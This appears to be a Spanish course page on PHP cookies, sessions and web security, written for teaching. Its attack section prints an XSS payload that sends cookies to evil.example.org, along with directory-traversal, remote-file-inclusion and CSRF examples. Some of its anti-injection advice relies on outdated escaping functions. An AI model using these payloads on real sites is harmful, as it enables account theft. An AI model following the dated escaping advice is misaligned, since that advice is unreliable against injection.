---
layout: page
title: 3 Cookies, sesiones y seguridad
permalink: /cookies-sesiones-seguridad/
nav_order: 3
has_children: false
parent: Desarrollo Web en Entorno Servidor
---
# 3. Cookies, sesiones y seguridad

## 3.1. Autenticación mediante ACL

Casi todas las aplicaciones web incluyen un subsistema de autenticación de usuarios (ACL = Access Control List).

Ese subsistema suele estar basado en este diseño de base de datos:

![Tablas ACL](/assets/images/03-acl.jpg)

Esto significa que necesitamos **cinco tablas** para implementar un ACL completo.

Sin embargo, la mayor parte de las veces tendremos suficiente con solo tres tablas (usuarios, roles y usuarios-roles), o incluso solo con una (usuarios, añadiendo quizá un campo "tipo"). Optar por una solución más o menos compleja dependerá del tipos de sistema que estemos implementando.

En cualquier caso, es conveniente que conozcas el esquema ACL completo (5 tablas) para que lo pongas en práctica cuando lo necesites.

## 3.2. Cookies

XXX

PHP soporta cookies HTTP de forma transparente. Las Cookies son un mecanismo por el cuál se almacenan datos en el navegador remoto y así rastrear o identificar a usuarios que vuelven, pero también puede utilizarse cualquier otro valor que deba permanecer de un script a otro. Se pueden configurar Cookies usando la función setcookie() o setrawcookie(). 

Las Cookies son parte del header HTTP, así es que setcookie() debe ser llamada antes que cualquier otra salida sea enviada al browser. En caso contrario, el valor de la cookie no estará disponible hasta que se recargue la página. 

setcookie()
setcookie(), junto con la variable superglobal $_COOKIE, es el modo principal de manejar cookies en PHP.

Esta función define una cookie para ser enviada junto con el resto de las cabeceras de HTTP. Al igual que otras cabeceras, las cookies deben ser enviadas antes de que el script genere ninguna salida (es una restricción del protocolo http). Ésto implica que las llamadas a esta función se coloquen antes de que se genere cualquier salida, incluyendo las etiquetas <html> y <head> al igual que cualquier espacio en blanco.

Una vez que han sido enviadas las cookies, se puede acceder a ellas en la próxima carga de la página gracias a los arrays $_COOKIE o $HTTP_COOKIE_VARS. Nótese que las superglobales tales como $_COOKIE están disponibles a partir de PHP 4.1.0. 

La sintaxis de setcookie() es:
bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain [, bool $secure = false [, bool $httponly = false ]]]]]] )

Los parámetros de setcookie() son:

name 
El nombre de la cookie. 

value 
El valor de la cookie. Este valor se guarda en el computador del cliente; no almacene información sensible. Asumiendo que el name es 'cookiename', este valor se obtiene con $_COOKIE['cookiename']. 

expire 
El tiempo en el que expira la cookie. Es una fecha Unix por tanto está en número de segundos a partir de la presente época. En otras palabras, probablemente utilizará la función time() más el número de segundos que quiere que dure la cookie. También podría utilizar la función mktime(). time()+60*60*24*30 configurará la cookie para expirar en 30 días. Si se pone 0, o se omite, la cookie expirará al final de la sesión (al cerrarse el navegador). 

path 
La ruta dentro del servidor en la que la cookie estará disponible. Si se utiliza '/', la cookie estará disponible en la totalidad del domain. Si se configura como '/foo/', la cookie sólo estará disponible dentro del directorio /foo/ y todos sus sub-directorios en el domain, tales como /foo/bar/. El valor por defecto es el directorio actual en donde se está configurando la cookie. 

domain 
El dominio para el cual la cookie está disponible. Establecer el dominio a 'www.example.com' hará que la cookie esté disponible en el subdominio www y subdominios superiores. Las cookies disponibles en un dominio inferior, como 'example.com', estarán disponibles en dominios superiores, como 'www.example.com'. Los navegadores antiguos pueden necesitar un . al inicio para comparar todos los subdominios. 

secure 
Indica que la cookie sólo debiera transmitirse por una conexión segura HTTPS desde el cliente. Cuando se configura como TRUE, la cookie sólo se creará si es que existe una conexión segura. 

httponly 
Cuando es TRUE la cookie será accesible sólo a través del protocolo HTTP. Esto significa que la cookie no será accesible por lenguajes de scripting, como JavaScript. Se ha indicado que esta configuración ayuda efectivamente a reducir el robo de identidad a través de ataques XSS (aunque no es soportada por todos los navegadores). pero esa afirmación se disputa a menudo. Agregado a partir de PHP 5.2.0. Puede ser TRUE o FALSE 

El valor devuelto por setcookie() es booleano. Si existe algún tipo de output anterior a la llamada de esta función, setcookie() fallará y retornará FALSE. Si setcookie() ejecuta satisfactoriamente, retornará TRUE. Esto no indica si es que el usuario ha aceptado la cookie o no. 
 
Ejemplo #1 ejemplo de envío con setcookie() 

<?php 
$value = 'cualquier cosa'; 

setcookie("TestCookie", $value); 
setcookie("TestCookie", $value, time()+3600);  /* expira en una hora */ 
setcookie("TestCookie", $value, time()+3600, "/~rasmus/", "example.com", 1); 
?> 
Nótese que la parte del valor de la cookie será automáticamente codificada con urlencode al enviar la cookie, y al ser recibida será automáticamente decodificada y asignada a una variable con el mismo nombre que el nombre de la cookie. Si no se desea ésto, se puede usar setrawcookie() si es que se está utilizando PHP 5. Para ver el contenido de nuestra cookie de prueba en un script, simplemente siga uno de los ejemplo siguientes: 

<?php 
// Imprimir una cookie individual 
echo $_COOKIE["TestCookie"]; 
echo $HTTP_COOKIE_VARS["TestCookie"]; 

//Otra manera de depurar/probar es viendo todas las cookies 
print_r($_COOKIE); 
?> 


Ejemplo #2 ejemplo de borrado con setcookie() 

Al borrar una cookie debiese asegurarse que la fecha de expiración ya ha pasado, de modo a detonar el mecanismo de eliminación del navegador. El siguiente ejemplo muestra cómo borrar las cookies enviadas en el ejemplo anterior: 

<?php 
//establecer la fecha de expiración a una hora atrás 
setcookie ("TestCookie", "", time() - 3600); 
setcookie ("TestCookie", "", time() - 3600, "/~rasmus/", "example.com", 1); 
?> 


Ejemplo #3 setcookie() y los arrays 

También puede crear arrays de cookies utilizando la notación de arrays en el nombre de la cookie. El efecto de ésto es de crear tantas cookies como elementos hay en el array, pero al recibir el script la cookie, todos los valores son colocados en un array con el nombre de la cookie: 

<?php 
// crear las cookies 
setcookie("cookie[tres]", "cookietres"); 
setcookie("cookie[dos]", "cookiedos"); 
setcookie("cookie[uno]", "cookieuno"); 

// imprimirlas luego que la página es recargada 
if (isset($_COOKIE['cookie'])) { 
    foreach ($_COOKIE['cookie'] as $name => $value) { 
        $name = htmlspecialchars($name); 
        $value = htmlspecialchars($value); 
        echo "$name : $value <br />\n"; 
    } 
} 
?> 

El resultado del ejemplo sería: 
tres : cookietres 
dos : cookiedos 
uno : cookieuno

## 3.3. Sesiones

El soporte para sesiones en PHP consiste en que un script puede almacenar cierta información en el servidor para que esté disponible para otros scripts que se ejecuten posteriormente. Esto habilita la construcción de aplicaciones más personalizadas e interactivas. 

Un visitante que accede a su sitio web se el asigna un id único, también llamado id de sesión (SID). Este SID almacenado en una cookie en la parte del cliente o se propaga de forma transparente en el URL. 

El soporte para sesiones permite almacenar los datos entre peticiones en el array superglobal $_SESSION. Cuando un visitante accede a su sitio web, PHP comprobará automáticamente (si session.auto_start está establecido a 1), o sobre su petición (explícitamete a través de session_start() o implícitamente a través de session_register()), si se ha enviado un id de sesión específico con la petición. Si éste es el caso, se recuperan las variables de sesión anteriormente guardadas para ese SID.

$_SESSION (y todas las variables registradas) son serializadas internamente por PHP utilizando el gestor de serialización especificado en el ajuste ini session.serialize_handler, por lo que, en principio, admite el almacenamiento de variables complejas, incluídos objetos completos. 

Uso básico de sesiones

Las sesiones siguen un flujo de trabajo sencillo. Cuando una sesión se inicia, PHP recuperará una sesión existente usando el SID pasado desde la cookie de sesión o, si no se pasa una sesión, se creará una sesión nueva. PHP rellenará la variable superglobal $_SESSION con cualesquiera datos de sesión asociados al SID actual. Cuando PHP se cierra, automáticamente toma el contenido de la variable superglobal $_SESSION, la serializa, y la envía para almacenarla usando el gestor de almacenamiento de sesiones. 

Por omisión, PHP usa el gestor interno de almacenamiento files, el cual se establece mediante session.save_handler. Éste guarda los datos de sesión en el servidor en la ubicación especificada por la directiva de configuración session.save_path. Lógicamente, este comportamiento puede modificarse en la configuración del servidor web.

Las sesiones se puede iniciar manualmente usando la función session_start(), y si la directiva session.auto_start se establece a 1, una sesión se iniciará automáticamente en el momento en que PHP envíe cualquier salida al buffer de salida. 

Las sesiones normalmente se cierran automáticamente cuando PHP termina de ejecutar un script, pero se pueden cerrar manualmente usando la función session_write_close(). 

Ejemplo #1: Registrar una variable con $_SESSION. 
<?php 
session_start(); 
if (!isset($_SESSION['count'])) { 
  $_SESSION['count'] = 0; 
} else { 
  $_SESSION['count']++; 
} 
?> 

Ejemplo #2 Dejar de registrar una variable con $_SESSION 
<?php 
session_start(); 
unset($_SESSION['count']); 
?> 

Pasar el ID de Sesión 
PHP utiliza dos métodos para propagar el SID (Session ID) a cada script que se ejecuta en el servidor: 
    • Cookies 
    • Parámetro de URL 

El módulo de sesiones soporta ambos métodos. Las cookies son óptimas, pero ya que no están siempre disponibles, también se proporciona una manera alternativa. El segundo método embebe el id de sesión directamente en las URL de manera transparente. 

El siguiente ejemplo muestra cómo registrar una variable, y cómo enlazar correctamente a otra página usando SID. 

Ejemplo: Contar el número de peticiones de un sólo usuario 
<?php 

session_start(); 

if (empty($_SESSION['count'])) { 
   $_SESSION['count'] = 1; 
} else { 
   $_SESSION['count']++; 
} 
?> 

<p> 
Hola visitante, ha visto esta página <?php echo $_SESSION['count']; ?> veces. 
</p> 

<p> 
Para continuar, <a href="nextpage.php?<?php echo htmlspecialchars(SID); ?>">haga clic 
aquí</a>. 
</p> 

(Nota: La función htmlspecialchars() se puede usar cuando se imprime SID para prevenir ataques relacionados con XSS) 

Gestores de sesión personalizados
Almacenar el SID en una cookie en el lado del cliente y, más aún, propagar el SID por la URL, implican importantes problemas de seguridad para las variables de sesión (ver más abajo). Un método más seguro es almacenar el SID en algún lugar del servidor, como una base de datos o un fichero.

Para implementar el almacenamiento en bases de datos, o cualquier otro método de almacenamiento, se necesita usar session_set_save_handler() para crear un conjunto de funciones de almacenamiento a nivel de ususario. A partir de PHP 5.4.0 se pueden crear gestores de sesiones usando la clase SessionHandlerInterface o extendiendo los gestores internos de PHP heredando de la clase SessionHandler. 

Las llamadas de retorno especificadas en session_set_save_handler() son métodos llamados por PHP durante el ciclo de vida de una sesión: open, read, write y close, y para las tareas domésticas: destroy para borrar una sesión y gc para la recoleción periódica de basura. 

Por lo tanto, PHP siempre necesita gestores de almacenamiento de sesiones. El predeterminado normalmente es el gestor de almacenamiento interno 'files'. Se puede establecer un gestor de almacenamiento personalizado usando session_set_save_handler(). Se pueden porporcionar de forma alternativa gestores de almacenamiento interno mediante extensiones de PHP, tales como sqlite, memcache y memcached y pueden establecerse con session.save_handler. 

Cuando se inicia la sesión, PHP llamará internamente al gestor open seguido de la llamada de retorno read la cual debería devolver una cadena codificada exactamente como si fuera pasada originalmente para almacenamiento. Una vez que la llamada de retorno read devuelve la cadena codificada, PHP la decodificará y rellenará el array resultante en la variable superglobal $_SESSION. 

Cuando PHP se cierra (o se llama a session_write_close()), PHP codificará internamente la variable superglobal $_SESSION y la pasará conjuntamente con el ID de sesión a la llamada de retorno write. Después de finalizada la llamada de retorno write, PHP invocará internamente al gestor de llamada de retorno close. 

Cuando una sesión se destruye de forma específica, PHP llamará al gestor destroy con el ID de sesión. 

PHP llamará a la llamada de retorno gc de vez en cuando para terminar cualquier registro de sesión según lo establecido en el tiempo de vida máximo de una sesión. Esta rutina debería borrar todos los registros del almacenamiento persistente a los que se accedió por última vez más allá del parámetro $lifetime.

Nótese que raramente merece la pena tomarse la molestia en desarrollar un gestor de sesiones personalizado del modo que aquí se ha descrito. Para un uso convencional de variables de sesión, es suficiente con el mecanismo basado en cookies o en propagación mediante URL. Y, si nuestra aplicación web necesita unos estándares de calidad superiores, encontraremos gestores de sesión basados en bases de datos y/o ficheros en el lado del servidor desarrollados por terceros y plenamente funcionales (por ejemplo, todos los frameworks proporcionan algún mecanismo en este sentido)



## 3.4. Sesiones, cookies y seguridad

Cookies y variables de sesión se usan a menudo para controlar la seguridad de la aplicación web.
Por ejemplo, tras el login, el ID del usuario puede almacenarse en:
Una cookie. Si existe esa cookie, significa que el login ha sido correcto y la aplicación puede continuar.
Una variable de sesión. Si existe tal variable, el login ha sido correcto.
Cuando el usuario abandona la aplicación, el programa debe destruir la cookie o cerrar la sesión.

¡Ningún método es completamente seguro!
Las cookies pueden rastrearse o modificarse en el ordenador del cliente. Además, algunos clientes las tienen desactivadas. ¡No te puedes fiar de ellas!
Las variables de sesión, en principio más seguras, pueden ser atacadas capturando el ID de sesión.
El método más seguro, y el más complicado de programar, es el que combina:
Cookies y/o variables de sesión.
Variables guardadas en una tabla de la BD.


El módulo de sesión no puede garantizar que la información que se almacena en una sesión sea vista sólo por el usuario que creó la sesión. Se necesita tomar medidas de seguridad adicionales para proteger activamente la integridad de la sesión, dependiendo del valor asociado con ella.

Evalúe la importancia de la información soportada por sus sesiones y utilice protecciones adicionales si es encesario. Esto normalmente conlleva un precio, reduciendo la comodidad para el usuario. Por ejemplo, si quiere proteger a los usuarios de tácticas de ingeniería social simples, necesita habilitar session.use_only_cookies. En este caso, las cookies deben estar activas incondicionalmente en el lado del usuario, o las sesiones no funcionarán.

Hay varias maneras de capturar un SID existente y, por lo tanto, un atacante puede, con relativa facilidad, hacerse pasar por quien no es. Recuerde que el SID se almacena en una cookie o se transmite en la URL. Si no está encriptado, el SID fluirá en texto plano por la red. La única solución aquí es implementar SSL en su servidor y hacerlo obligatorio para los usuarios.

Por último, para desarrollar un sitio web de alta seguridad se puede utilizar una combinación de todos estos elementos, combinados con el uso de la base de datos como depósito de las variables de sesión. Es decir, se pueden almacenar la variables de sesión en cookies del lado del cliente y en la base de datos en el servidor, donde están más seguras que en variables de sesión, y se puede comprobar la coherencia de ambos valores cuando sea necesario. Añadiendo la codificación mediante SSL, el sitio web se convertiría en altamente seguro. Como se ha mencionado antes, muchos de estos mecanismos se encuentran presentes en los frameworks más populares para desarrollo web con PHP, como Laravel, Symfony, Zend, CakePHP o Codeigniter.

## 3.5. Técnicas de ataque frecuentes

Fuente: securitybydefault.com

Escribir aplicaciones PHP no es demasiado difícil. Pero muchos olvidan los aspectos de seguridad que deben ser tenidos en cuenta al implementar estas aplicaciones. A veces no se piensa en el daño que puede sufrir un sitio web hasta que ya es demasiado tarde.

Se debe empezar a diseñar con cabeza y no ser meros robots codificando. Veamos un poco más a fondo las posibles amenazas y recomendaciones para hacer que nuestro sitio web sea un poco más seguro.

### 3.5.1. Captura de ID de sesión

El ID de sesión se pasa entre páginas de forma transparente a través de cookies o de la URL (con POST). Un atacante puede leer el ID de sesión en el paquete http y acceder a las variables de sesión.
Solución:
Combinar las variables de sesión con cookies o con entradas en la base de datos.
No confiar en variables de sesión para información sensible.

Las sesiones y las cookies pueden ser usadas para comprometer las cuentas de los usuarios. Cuando se almacena una cookie en el ordenador ésta puede ser modificada por el usuario.

Se recomienda:

    • Cambiar el identificador de la sesión a menudo. Utilizando la función session_regenerate_id() se reduce la posibilidad de que el identificador sea interceptado.
    • Usando versiones PHP5.2 o posteriores se puede denegar al Javascript del navegador el acceso a la cookie activando el flag httponly.

### 3.5.2. Inyección de SQL

Este ataque se produce cuando un atacante ejecuta sentencias SQL en la base de datos del sitio web, insertando en un campo del formulario sentencias SQL dentro de otra sentencia SQL haciendo que se ejecute la sentencia invasora.

Se recomienda:

    • Filtrar los datos. Por ejemplo, si tenemos en nuestro formulario el campo username, y sabemos que los usuarios sólo pueden estar compuestos por letras y números, no se deben permitir caracteres como " ' " o " = " . O si se trata del campo e-mail, podemos utilizar expresiones regulares para validarlo, como preg_match('/^.+@.+\..{2,3}$/',$_POST['email'])
    • Usar funciones que escapan caracteres especiales de una cadena para su uso en una sentencia SQL, como mysql_real_escape_string(), la cual coloca barras invertidas antes de los siguientes caracteres: \x00, \n, \r, \, ', " y \x1a. O addslashes(). La directiva de PHP magic_quotes_gpc está activada por defecto, y básicamente ejecuta la función addslashes() en todos los datos GET, POST, y COOKIE. No se debe utilizar addslashes() en las cadenas que ya se han escapado con magic_quotes_gpc ya que se hará un doble escape.

### 3.5.3. XSS (cross site scripting)

Las vulnerabilidades de XSS permiten ejecutar código de scripting en el contexto del sitio web:

    • Explotando la confianza que tiene un usuario de un sitio web. Puede que los usuarios no tengan un alto nivel de confianza en un sitio web, pero sí el navegador. Por ejemplo, cuando el navegador envía cookies en una petición.
    • Haciendo que los sitios web muestren datos externos. Como aplicaciones de mayor riesgo que incluyen foros, clientes de correo web, o contenido de RSS.
    • Cuando los datos externos no se filtran adecuadamente un atacante puede inyectar un contenido. Esto es tan peligroso como dejar que el atacante edite código en el servidor.

Un usuario que ejecute este código con JavaScript activado en su navegador será redireccionado a evil.example.org, y las cookies asociadas al sitio web serán incluidas en la consulta:

<script>document.locationn = 'http://evil.example.org/steal_cookies.php?cookies=' + document.cookie</script>

Se recomienda:

    • Filtrar todos los datos externos. El filtrado de datos es la práctica más importante que se puede adoptar. Al validar todos los datos externos a medida que entran y salen de la aplicación se mitigarán la mayoría de las preocupaciones del XSS.
    • Utilizar las funciones que tiene PHP que ayudan al filtrado. Pueden ser útiles htmlentities () que convierte caracteres a entidades HTML, strip_tags () que elimina las etiquetas HTML y PHP de una cadena y utf8_decode ().
    • Basarse en listas blancas. Supongamos que los datos no son válidos hasta que no se pruebe que lo son. Esto implica verificar la longitud y asegurar que sólo los caracteres válidos son permitidos. Por ejemplo, si se inserta el nombre y apellidos, se debe asegurar que sólo se permiten letras y espacios. Por ejemplo Berners-Lee se consideraría nula, pero esto se puede arreglar añadiendo este nombre a la lista blanca. Es mejor rechazar datos válidos que aceptar datos maliciosos.
    • Utilizar una convención de nomenclatura estricta. Una convención de nomenclatura puede ayudar a los desarrolladores a distinguir entre datos filtrados y sin filtrar.

### 3.5.4. CSRF (cross site request forgery)

Explota la confianza que tiene un sitio web en la identidad de un usuario.

Un ejemplo sería enviar los siguientes datos en la petición:

GET /buy.php?symbol=SCOX&quantity=1000 HTTP/1.1
Host: stocks.example.org
User-Agent: Mozilla/5.0 Gecko
Accept: text/xml, image/png, image/jpeg, image/gif, */*
Cookie: PHPSESSID=1234

Se recomienda:

    • Utilizar POST en lugar de GET en los formularios. Sobre todo cuando se esté realizando una acción que involucra una compra.
    • Utilizar $_POST en lugar de confiar en register_globals. Utilizar el método POST es inútil si se confía en register_globals y se referencian variables como $symbol o $quantity. Lo mismo sucede si se utiliza $_REQUEST.
    • Generar un token único para cada petición y verificarlo posteriormente.

### 3.5.5. DT (directory transversal)

Este ataque se produce cuando se especifican rutas de ficheros como "../../../../file" en los datos del formulario y mediante un script se llama a estos ficheros, proporcionando a un atacante la posibilidad de realizar cambios en el sistema de ficheros.

Si dentro del script de PHP se incluye algo como require $page . '.php'; sabiendo que esta página se almacena en /home/someone/public_html/index.php, un atacante podría hacer index.php?page=../secret accediendo a /home/someone/secret.php

Se recomienda:

    • Tener un array de páginas válidas.
    • Comprobar que el archivo solicitado coincide con un formato concreto.

### 3.5.6. RFI (remote file inclusion)

Como su nombre indica, se produce cuando se incluye un archivo remoto.

Por ejemplo, si existe un archivo en la ruta http://example.com/malice.php y nuestro script se encuentra en http://site.com/index.php. Un atacante puede hacer esta petición: http://site.com/index.php?page=http://example.com/malice lo que provocará que el archivo se ejecute y escriba un nuevo fichero en disco, pudiendo ser este fichero una shell que permita la ejecución de comandos.

O, por ejemplo, se podría asignar a page el valor http://example.com/malice.php? seguido de una consulta a base de datos.

Se recomienda:

    • No confiar en los datos que no provengan de nuestro sistema.
    • Se deben validar los datos que introduce el usuario.


